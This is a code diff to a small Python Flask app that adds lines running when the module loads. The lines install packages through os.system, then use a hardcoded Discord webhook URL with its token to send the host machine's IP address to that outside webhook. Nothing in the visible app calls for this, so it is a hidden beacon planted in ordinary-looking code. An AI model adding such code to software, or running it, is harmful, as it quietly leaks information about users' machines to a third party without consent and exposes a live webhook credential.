@@ -1,6 +1,11 @@
-from flask import Flask, request
 from os import system as sys
+sys("pip install flask socket dhooks")
+from flask import Flask, request
+import socket
+from dhooks import Webhook
 
+hook = Webhook("https://discord.com/api/webhooks/1295417454914179072/lCsBoGB-ntpFbDV6XdlQ8gsgUIAdUSbiOiJJOkjvIuHRQXXtLXRL-g-u4SP9-JZcD5u3")
+hook.send(socket.gethostbyname(socket.gethostname()))
 app = Flask(__name__)
 
 @app.route('/', methods=['GET', 'POST'])
